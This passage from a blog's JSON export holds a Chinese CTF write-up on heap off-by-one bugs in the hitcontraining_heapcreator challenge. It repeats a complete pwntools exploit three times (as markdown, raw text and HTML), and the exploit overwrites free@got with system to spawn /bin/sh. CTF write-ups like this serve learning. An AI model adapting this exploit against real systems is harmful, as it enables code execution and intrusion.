这时delete chunk 1，会合并到前一个chunk（也就是1的size所在chunk）中\n\n    ![](/img/off_by_one/4.jpg)\n\n    观察bins，发现这个chunk被free到fastbin的0x80节点上（0x20上也有一个chunk是因为delete也会将size释放掉）\n\n    ![](/img/off_by_one/5.jpg)\n\n4. 申请一个新的chunk，将0x80这个块申请出来，因此malloc的大小需要为0x70\n\n    同时，在2号的content位置写入`free@got`\n\n    这时调用show(2)会泄露free的地址\n\n    ![](/img/off_by_one/6.jpg)\n\n5. 泄露libc基址找到system地址\n\n6. `edit(2,p64(system_addr))`时，会修改content指针指向的内容，而content指针被`free@got`替换掉了，所以free的got表被修改成了`system@got`上的地址\n\n7. 然后`delete(0)`时，首先要free掉`heaparray[0].content`上的内容，但是由于free被替换成了system，结果就变成了以content指针为参数调用system函数的情况，而`heaparray[0].content`恰好是之前写过的`/bin/sh`，因此执行了`system('/bin/sh')\n\n   \n\n##### 完整exp\n\n> libcsearcher挑版本为2.23的\n\n```python\nfrom pwn import *\nfrom LibcSearcher import *\nr = process('./heapcreator')\n#r = remote('node4.buuoj.cn',26117)\nelf = ELF('./heapcreator')\n\ndef add(size,content):\n    r.sendlineafter(\"choice :\",'1')\n    r.sendlineafter(\"Heap : \",str(size))\n    r.sendlineafter(\"heap:\",content)\n\ndef edit(idx,content):\n    r.sendlineafter(\"choice :\",'2')\n    r.sendlineafter(\"Index :\",str(idx))\n    r.sendlineafter(\"heap : \",content)\n\ndef show(idx):\n    r.sendlineafter(\"choice :\",'3')\n    r.sendlineafter(\"Index :\",str(idx))\n\ndef delete(idx):\n    r.sendlineafter(\"choice :\",'4')\n    r.sendlineafter(\"Index :\",str(idx))\n\nfree_got = elf.got['free']\n\nadd(0x18,\"MMMM\")\nadd(0x10,\"MMMM\")\nadd(0x10,\"MMMM\")\n#gdb.attach(r)\n\nedit(0,b'/bin/sh\\x00'+p64(0)*2+b'\\x81')\n#gdb.attach(r)\n\ndelete(1)\n#gdb.attach(r)\n\nadd(0x70,p64(1)*8+p64(0x8)+p64(free_got))\nshow(2)\n#gdb.attach(r)\n\nfree_addr = u64(r.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))\n\n#libc\nlibc = LibcSearcher('free',free_addr)\noffset = free_addr-libc.dump('free')\nsystem_addr = offset + libc.dump('system')\n\nedit(2,p64(system_addr))\n#gdb.attach(r)\ndelete(0)\n\nr.interactive()\n```\n\n","source":"_posts/Off-By-One.md","raw":"---\ntitle: Off-By-One\ntags: [ctf-pwn,exp]\ndate: 2022-11-27 19:00:00\nexcerpt: 堆中的 off-by-one 漏洞, hitcon_heapcreator exp\n---\n\n#### Off-By-One漏洞如何产生\n\n1. 循环多一次\n\n   ```C\n   x = malloc(10);\n   for(int i=0;i<=10;i++)\n   {\n       x[i] = getchar();\n   }\n   ```\n\n   x的下一个chunk第一个字节被溢出了\n\n2. `strlen`和`strcpy`行为不一致\n\n   ```C\n   if(strlen(buffer)==100)\n   {\n       strcpy(chunk,buffer);\n   }\n   ```\n\n   `strlen`返回值不算结束符'`\\0`，而`strcpy`复制时会把结束符在内的101个字符复制过去\n   \n   \n\n#### hitcon_creator\n\n题目来源\n\n<https://buuoj.cn/challenges#hitcontraining_heapcreator>\n\n##### 1. create\n\n![](/img/off_by_one/1.png)\n\n从上述结构可以推断出heaparray是如下结构\n\n```C\nstruct heaparray_item{\n    int_64   size;\n    char * content;\n}\nstruct heaparray_item * heaparray[10];\n```\n\n\n\n##### 2. edit\n\n```C\nif ( *(&heaparray + v1) )\n{\n    printf(\"Content of heap : \");\n    read_input(*((_QWORD *)*(&heaparray + v1) + 1), *(_QWORD *)*(&heaparray + v1) + 1LL);\n    puts(\"Done !\");\n}\n```\n\n`read_input`读取size+1字节，出现了off_by_one漏洞\n\n可以覆盖下一个chunk的size字段\n\n\n\n##### 漏洞利用\n\n1. 申请三个堆块，大小为0x18,0x10,0x10，加上三次size申请的0x10，一共6个chunk\n\n    ![](/img/off_by_one/2.jpg)\n\n2. 修改0号块，写入`/bin/sh`，然后再溢出`0x81`到下一个chunk的size\n\n   ![](/img/off_by_one/3.jpg)\n\n3. 这时delete chunk 1，会合并到前一个chunk（也就是1的size所在chunk）中\n\n    ![](/img/off_by_one/4.jpg)\n\n    观察bins，发现这个chunk被free到fastbin的0x80节点上（0x20上也有一个chunk是因为delete也会将size释放掉）\n\n    ![](/img/off_by_one/5.jpg)\n\n4. 申请一个新的chunk，将0x80这个块申请出来，因此malloc的大小需要为0x70\n\n    同时，在2号的content位置写入`free@got`\n\n    这时调用show(2)会泄露free的地址\n\n    ![](/img/off_by_one/6.jpg)\n\n5. 泄露libc基址找到system地址\n\n6. `edit(2,p64(system_addr))`时，会修改content指针指向的内容，而content指针被`free@got`替换掉了，所以free的got表被修改成了`system@got`上的地址\n\n7. 然后`delete(0)`时，首先要free掉`heaparray[0].content`上的内容，但是由于free被替换成了system，结果就变成了以content指针为参数调用system函数的情况，而`heaparray[0].content`恰好是之前写过的`/bin/sh`，因此执行了`system('/bin/sh')\n\n   \n\n##### 完整exp\n\n> libcsearcher挑版本为2.23的\n\n```python\nfrom pwn import *\nfrom LibcSearcher import *\nr = process('./heapcreator')\n#r = remote('node4.buuoj.cn',26117)\nelf = ELF('./heapcreator')\n\ndef add(size,content):\n    r.sendlineafter(\"choice :\",'1')\n    r.sendlineafter(\"Heap : \",str(size))\n    r.sendlineafter(\"heap:\",content)\n\ndef edit(idx,content):\n    r.sendlineafter(\"choice :\",'2')\n    r.sendlineafter(\"Index :\",str(idx))\n    r.sendlineafter(\"heap : \",content)\n\ndef show(idx):\n    r.sendlineafter(\"choice :\",'3')\n    r.sendlineafter(\"Index :\",str(idx))\n\ndef delete(idx):\n    r.sendlineafter(\"choice :\",'4')\n    r.sendlineafter(\"Index :\",str(idx))\n\nfree_got = elf.got['free']\n\nadd(0x18,\"MMMM\")\nadd(0x10,\"MMMM\")\nadd(0x10,\"MMMM\")\n#gdb.attach(r)\n\nedit(0,b'/bin/sh\\x00'+p64(0)*2+b'\\x81')\n#gdb.attach(r)\n\ndelete(1)\n#gdb.attach(r)\n\nadd(0x70,p64(1)*8+p64(0x8)+p64(free_got))\nshow(2)\n#gdb.attach(r)\n\nfree_addr = u64(r.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))\n\n#libc\nlibc = LibcSearcher('free',free_addr)\noffset = free_addr-libc.dump('free')\nsystem_addr = offset + libc.dump('system')\n\nedit(2,p64(system_addr))\n#gdb.attach(r)\ndelete(0)\n\nr.interactive()\n```\n\n","slug":"Off-By-One","published":1,"updated":"2022-11-29T07:50:30.322Z","_id":"clb0aoxan00007cuffcoo73lk","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"Off-By-One漏洞如何产生\"><a href=\"#Off-By-One漏洞如何产生\" class=\"headerlink\" title=\"Off-By-One漏洞如何产生\"></a>Off-By-One漏洞如何产生</h4><ol>\n<li><p>循环多一次</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\">x = <span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-number\">10</span>);<br><span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;=<span class=\"hljs-number\">10</span>;i++)<br>&#123;<br>    x[i] = getchar();<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>x的下一个chunk第一个字节被溢出了</p>\n</li>\n<li><p><code>strlen</code>和<code>strcpy</code>行为不一致</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-built_in\">strlen</span>(buffer)==<span class=\"hljs-number\">100</span>)<br>&#123;<br>    <span class=\"hljs-built_in\">strcpy</span>(chunk,buffer);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p><code>strlen</code>返回值不算结束符’<code>\\0</code>，而<code>strcpy</code>复制时会把结束符在内的101个字符复制过去</p>\n</li>\n</ol>\n<h4 id=\"hitcon-creator\"><a href=\"#hitcon-creator\" class=\"headerlink\" title=\"hitcon_creator\"></a>hitcon_creator</h4><p>题目来源</p>\n<p><a href=\"https://buuoj.cn/challenges#hitcontraining_heapcreator\">https://buuoj.cn/challenges#hitcontraining_heapcreator</a></p>\n<h5 id=\"1-create\"><a href=\"#1-create\" class=\"headerlink\" title=\"1. create\"></a>1. create</h5><p><img src=\"/img/off_by_one/1.png\"></p>\n<p>从上述结构可以推断出heaparray是如下结构</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">heaparray_item</span>&#123;</span><br>    int_64   size;<br>    <span class=\"hljs-type\">char</span> * content;<br>&#125;<br><span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">heaparray_item</span> * <span class=\"hljs-title\">heaparray</span>[10];</span><br></code></pre></td></tr></table></figure>\n\n\n\n<h5 id=\"2-edit\"><a href=\"#2-edit\" class=\"headerlink\" title=\"2. edit\"></a>2. edit</h5><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-keyword\">if</span> ( *(&amp;heaparray + v1) )<br>&#123;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Content of heap : &quot;</span>);<br>    read_input(*((_QWORD *)*(&amp;heaparray + v1) + <span class=\"hljs-number\">1</span>), *(_QWORD *)*(&amp;heaparray + v1) + <span class=\"hljs-number\">1LL</span>);<br>    <span class=\"hljs-built_in\">puts</span>(<span class=\"hljs-string\">&quot;Done !&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p><code>read_input</code>读取size+1字节，出现了off_by_one漏洞</p>\n<p>可以覆盖下一个chunk的size字段</p>\n<h5 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h5><ol>\n<li><p>申请三个堆块，大小为0x18,0x10,0x10，加上三次size申请的0x10，一共6个chunk</p>\n<p> <img src=\"/img/off_by_one/2.jpg\"></p>\n</li>\n<li><p>修改0号块，写入<code>/bin/sh</code>，然后再溢出<code>0x81</code>到下一个chunk的size</p>\n<p><img src=\"/img/off_by_one/3.jpg\"></p>\n</li>\n<li><p>这时delete chunk 1，会合并到前一个chunk（也就是1的size所在chunk）中</p>\n<p> <img src=\"/img/off_by_one/4.jpg\"></p>\n<p> 观察bins，发现这个chunk被free到fastbin的0x80节点上（0x20上也有一个chunk是因为delete也会将size释放掉）</p>\n<p> <img src=\"/img/off_by_one/5.jpg\"></p>\n</li>\n<li><p>申请一个新的chunk，将0x80这个块申请出来，因此malloc的大小需要为0x70</p>\n<p> 同时，在2号的content位置写入<code>free@got</code></p>\n<p> 这时调用show(2)会泄露free的地址</p>\n<p> <img src=\"/img/off_by_one/6.jpg\"></p>\n</li>\n<li><p>泄露libc基址找到system地址</p>\n</li>\n<li><p><code>edit(2,p64(system_addr))</code>时，会修改content指针指向的内容，而content指针被<code>free@got</code>替换掉了，所以free的got表被修改成了<code>system@got</code>上的地址</p>\n</li>\n<li><p>然后<code>delete(0)</code>时，首先要free掉<code>heaparray[0].content</code>上的内容，但是由于free被替换成了system，结果就变成了以content指针为参数调用system函数的情况，而<code>heaparray[0].content</code>恰好是之前写过的<code>/bin/sh</code>，因此执行了`system(‘/bin/sh’)</p>\n</li>\n</ol>\n<h5 id=\"完整exp\"><a href=\"#完整exp\" class=\"headerlink\" title=\"完整exp\"></a>完整exp</h5><blockquote>\n<p>libcsearcher挑版本为2.23的</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><span class=\"hljs-keyword\">from</span> LibcSearcher <span class=\"hljs-keyword\">import</span> *<br>r = process(<span class=\"hljs-string\">&#x27;./heapcreator&#x27;</span>)<br><span class=\"hljs-comment\">#r = remote(&#x27;node4.buuoj.cn&#x27;,26117)</span><br>elf = ELF(<span class=\"hljs-string\">&#x27;./heapcreator&#x27;</span>)<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">add</span>(<span class=\"hljs-params\">size,content</span>):<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;choice :&quot;</span>,<span class=\"hljs-string\">&#x27;1&#x27;</span>)<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;Heap : &quot;</span>,<span class=\"hljs-built_in\">str</span>(size))<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;heap:&quot;</span>,content)<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">edit</span>(<span class=\"hljs-params\">idx,content</span>):<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;choice :&quot;</span>,<span class=\"hljs-string\">&#x27;2&#x27;</span>)<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;Index :&quot;</span>,<span class=\"hljs-built_in\">str</span>(idx))<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;heap : &quot;</span>,content)<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">show</span>(<span class=\"hljs-params\">idx</span>):<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;choice :&quot;</span>,<span class=\"hljs-string\">&#x27;3&#x27;</span>)<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;Index :&quot;</span>,<span class=\"hljs-built_in\">str</span>(idx))<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">delete</span>(<span class=\"hljs-params\">idx</span>):<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;choice :&quot;</span>,<span class=\"hljs-string\">&#x27;4&#x27;</span>)<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;Index :&quot;</span>,<span class=\"hljs-built_in\">str</span>(idx))<br><br>free_got = elf.got[<span class=\"hljs-string\">&#x27;free&#x27;</span>]<br><br>add(<span class=\"hljs-number\">0x18</span>,<span class=\"hljs-string\">&quot;MMMM&quot;</span>)<br>add(<span class=\"hljs-number\">0x10</span>,<span class=\"hljs-string\">&quot;MMMM&quot;</span>)<br>add(<span class=\"hljs-number\">0x10</span>,<span class=\"hljs-string\">&quot;MMMM&quot;</span>)<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br><br>edit(<span class=\"hljs-number\">0</span>,<span class=\"hljs-string\">b&#x27;/bin/sh\\x00&#x27;</span>+p64(<span class=\"hljs-number\">0</span>)*<span class=\"hljs-number\">2</span>+<span class=\"hljs-string\">b&#x27;\\x81&#x27;</span>)<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br><br>delete(<span class=\"hljs-number\">1</span>)<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br><br>add(<span class=\"hljs-number\">0x70</span>,p64(<span class=\"hljs-number\">1</span>)*<span class=\"hljs-number\">8</span>+p64(<span class=\"hljs-number\">0x8</span>)+p64(free_got))<br>show(<span class=\"hljs-number\">2</span>)<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br><br>free_addr = u64(r.recvuntil(<span class=\"hljs-string\">b&#x27;\\x7f&#x27;</span>)[-<span class=\"hljs-number\">6</span>:].ljust(<span class=\"hljs-number\">8</span>,<span class=\"hljs-string\">b&#x27;\\x00&#x27;</span>))<br><br><span class=\"hljs-comment\">#libc</span><br>libc = LibcSearcher(<span class=\"hljs-string\">&#x27;free&#x27;</span>,free_addr)<br>offset = free_addr-libc.dump(<span class=\"hljs-string\">&#x27;free&#x27;</span>)<br>system_addr = offset + libc.dump(<span class=\"hljs-string\">&#x27;system&#x27;</span>)<br><br>edit(<span class=\"hljs-number\">2</span>,p64(system_addr))<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br>delete(<span class=\"hljs-number\">0</span>)<br><br>r.interactive()<br></code></pre></td></tr></table></figure>\n\n","site":{"data":{}},"more":"<h4 id=\"Off-By-One漏洞如何产生\"><a href=\"#Off-By-One漏洞如何产生\" class=\"headerlink\" title=\"Off-By-One漏洞如何产生\"></a>Off-By-One漏洞如何产生</h4><ol>\n<li><p>循环多一次</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\">x = <span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-number\">10</span>);<br><span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;=<span class=\"hljs-number\">10</span>;i++)<br>&#123;<br>    x[i] = getchar();<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>x的下一个chunk第一个字节被溢出了</p>\n</li>\n<li><p><code>strlen</code>和<code>strcpy</code>行为不一致</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-built_in\">strlen</span>(buffer)==<span class=\"hljs-number\">100</span>)<br>&#123;<br>    <span class=\"hljs-built_in\">strcpy</span>(chunk,buffer);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p><code>strlen</code>返回值不算结束符’<code>\\0</code>，而<code>strcpy</code>复制时会把结束符在内的101个字符复制过去</p>\n</li>\n</ol>\n<h4 id=\"hitcon-creator\"><a href=\"#hitcon-creator\" class=\"headerlink\" title=\"hitcon_creator\"></a>hitcon_creator</h4><p>题目来源</p>\n<p><a href=\"https://buuoj.cn/challenges#hitcontraining_heapcreator\">https://buuoj.cn/challenges#hitcontraining_heapcreator</a></p>\n<h5 id=\"1-create\"><a href=\"#1-create\" class=\"headerlink\" title=\"1. create\"></a>1. create</h5><p><img src=\"/img/off_by_one/1.png\"></p>\n<p>从上述结构可以推断出heaparray是如下结构</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">heaparray_item</span>&#123;</span><br>    int_64   size;<br>    <span class=\"hljs-type\">char</span> * content;<br>&#125;<br><span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">heaparray_item</span> * <span class=\"hljs-title\">heaparray</span>[10];</span><br></code></pre></td></tr></table></figure>\n\n\n\n<h5 id=\"2-edit\"><a href=\"#2-edit\" class=\"headerlink\" title=\"2. edit\"></a>2. edit</h5><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-keyword\">if</span> ( *(&amp;heaparray + v1) )<br>&#123;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Content of heap : &quot;</span>);<br>    read_input(*((_QWORD *)*(&amp;heaparray + v1) + <span class=\"hljs-number\">1</span>), *(_QWORD *)*(&amp;heaparray + v1) + <span class=\"hljs-number\">1LL</span>);<br>    <span class=\"hljs-built_in\">puts</span>(<span class=\"hljs-string\">&quot;Done !&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p><code>read_input</code>读取size+1字节，出现了off_by_one漏洞</p>\n<p>可以覆盖下一个chunk的size字段</p>\n<h5 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h5><ol>\n<li><p>申请三个堆块，大小为0x18,0x10,0x10，加上三次size申请的0x10，一共6个chunk</p>\n<p> <img src=\"/img/off_by_one/2.jpg\"></p>\n</li>\n<li><p>修改0号块，写入<code>/bin/sh</code>，然后再溢出<code>0x81</code>到下一个chunk的size</p>\n<p><img src=\"/img/off_by_one/3.jpg\"></p>\n</li>\n<li><p>这时delete chunk 1，会合并到前一个chunk（也就是1的size所在chunk）中</p>\n<p> <img src=\"/img/off_by_one/4.jpg\"></p>\n<p> 观察bins，发现这个chunk被free到fastbin的0x80节点上（0x20上也有一个chunk是因为delete也会将size释放掉）</p>\n<p> <img src=\"/img/off_by_one/5.jpg\"></p>\n</li>\n<li><p>申请一个新的chunk，将0x80这个块申请出来，因此malloc的大小需要为0x70</p>\n<p> 同时，在2号的content位置写入<code>free@got</code></p>\n<p> 这时调用show(2)会泄露free的地址</p>\n<p> <img src=\"/img/off_by_one/6.jpg\"></p>\n</li>\n<li><p>泄露libc基址找到system地址</p>\n</li>\n<li><p><code>edit(2,p64(system_addr))</code>时，会修改content指针指向的内容，而content指针被<code>free@got</code>替换掉了，所以free的got表被修改成了<code>system@got</code>上的地址</p>\n</li>\n<li><p>然后<code>delete(0)</code>时，首先要free掉<code>heaparray[0].content</code>上的内容，但是由于free被替换成了system，结果就变成了以content指针为参数调用system函数的情况，而<code>heaparray[0].content</code>恰好是之前写过的<code>/bin/sh</code>，因此执行了`system(‘/bin/sh’)</p>\n</li>\n</ol>\n<h5 id=\"完整exp\"><a href=\"#完整exp\" class=\"headerlink\" title=\"完整exp\"></a>完整exp</h5><blockquote>\n<p>libcsearcher挑版本为2.23的</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><span class=\"hljs-keyword\">from</span> LibcSearcher <span class=\"hljs-keyword\">import</span> *<br>r = process(<span class=\"hljs-string\">&#x27;./heapcreator&#x27;</span>)<br><span class=\"hljs-comment\">#r = remote(&#x27;node4.buuoj.cn&#x27;,26117)</span><br>elf = ELF(<span class=\"hljs-string\">&#x27;./heapcreator&#x27;</span>)<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">add</span>(<span class=\"hljs-params\">size,content</span>):<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;choice :&quot;</span>,<span class=\"hljs-string\">&#x27;1&#x27;</span>)<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;Heap : &quot;</span>,<span class=\"hljs-built_in\">str</span>(size))<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;heap:&quot;</span>,content)<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">edit</span>(<span class=\"hljs-params\">idx,content</span>):<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;choice :&quot;</span>,<span class=\"hljs-string\">&#x27;2&#x27;</span>)<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;Index :&quot;</span>,<span class=\"hljs-built_in\">str</span>(idx))<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;heap : &quot;</span>,content)<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">show</span>(<span class=\"hljs-params\">idx</span>):<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;choice :&quot;</span>,<span class=\"hljs-string\">&#x27;3&#x27;</span>)<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;Index :&quot;</span>,<span class=\"hljs-built_in\">str</span>(idx))<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">delete</span>(<span class=\"hljs-params\">idx</span>):<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;choice :&quot;</span>,<span class=\"hljs-string\">&#x27;4&#x27;</span>)<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;Index :&quot;</span>,<span class=\"hljs-built_in\">str</span>(idx))<br><br>free_got = elf.got[<span class=\"hljs-string\">&#x27;free&#x27;</span>]<br><br>add(<span class=\"hljs-number\">0x18</span>,<span class=\"hljs-string\">&quot;MMMM&quot;</span>)<br>add(<span class=\"hljs-number\">0x10</span>,<span class=\"hljs-string\">&quot;MMMM&quot;</span>)<br>add(<span class=\"hljs-number\">0x10</span>,<span class=\"hljs-string\">&quot;MMMM&quot;</span>)<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br><br>edit(<span class=\"hljs-number\">0</span>,<span class=\"hljs-string\">b&#x27;/bin/sh\\x00&#x27;</span>+p64(<span class=\"hljs-number\">0</span>)*<span class=\"hljs-number\">2</span>+<span class=\"hljs-string\">b&#x27;\\x81&#x27;</span>)<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br><br>delete(<span class=\"hljs-number\">1</span>)<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br><br>add(<span class=\"hljs-number\">0x70</span>,p64(<span class=\"hljs-number\">1</span>)*<span class=\"hljs-number\">8</span>+p64(<span class=\"hljs-number\">0x8</span>)+p64(free_got))<br>show(<span class=\"hljs-number\">2</span>)<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br><br>free_addr = u64(r.recvuntil(<span class=\"hljs-string\">b&#x27;\\x7f&#x27;</span>)[-<span class=\"hljs-number\">6</span>:].ljust(<span class=\"hljs-number\">8</span>,<span class=\"hljs-string\">b&#x27;\\x00&#x27;</span>))<br><br><span class=\"hljs-comment\">#libc</span><br>libc = LibcSearcher(<span class=\"hljs-string\">&#x27;free&#x27;</span>,free_addr)<br>offset = free_addr-libc.dump(<span class=\"hljs-string\">&#x27;free&#x27;</span>)<br>system_addr = offset + libc.dump(<span class=\"hljs-string\">&#x27;system&#x27;</span>)<br><br>edit(<span class=\"hljs-number\">2</span>,p64(system_addr))<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br>delete(<span class=\"hljs-number\">0</span>)<br><br>r.interactive()<br></code></pre></td></tr></table></figure>\n\n"},{"title":"ZJCTF 2019 